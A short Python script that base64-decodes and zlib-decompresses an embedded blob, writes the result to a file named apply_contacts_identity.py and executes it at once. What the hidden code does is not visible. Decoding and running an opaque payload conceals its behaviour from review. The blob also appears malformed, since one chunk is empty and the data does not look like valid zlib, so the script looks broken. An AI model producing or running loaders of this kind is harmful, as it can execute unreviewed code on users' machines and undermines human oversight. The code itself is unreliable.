#!/usr/bin/env python3
import base64, zlib, pathlib, subprocess, sys
parts = [
    '',
    'e31TGIi8RWGZVE+tzqmGX4PfyS23XtjkFUNHaVOs6+LmvsVHqaLxIZ7iFM6Pd33lH1Qg8b+JL9/0qoWPIdz8JkOV6P2rtjUJjdooraPDGn59MOIbmnv752fe4aOD4/PD86+8ky/geP4H6YYAQQ=='
]
data = base64.b64decode("".join(parts))
code = zlib.decompress(data)
path = pathlib.Path("tools/contacts/apply_contacts_identity.py")
path.write_bytes(code)
print("wrote", path, len(code))
raise SystemExit(subprocess.call([sys.executable, str(path)]))
